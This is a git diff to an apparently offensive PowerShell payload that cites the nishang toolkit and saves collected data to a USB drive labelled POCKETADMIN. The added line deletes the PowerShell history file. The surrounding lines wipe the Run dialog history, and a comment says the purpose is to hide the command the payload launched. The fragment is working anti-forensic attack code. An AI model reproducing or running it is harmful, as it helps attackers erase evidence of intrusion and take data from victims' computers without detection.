@@ -78,8 +78,9 @@ https://github.com/samratashok/nishang
 
 }
 
-#clean runline history to hide the command launched by this payload
+#clean runline and powershell history to hide the command launched by this payload
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' * -ErrorAction SilentlyContinue
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 #find correct driveletter, and path. Then save collected data into a file
 $driveletter=(Get-Volume -FileSystemLabel POCKETADMIN).DriveLetter
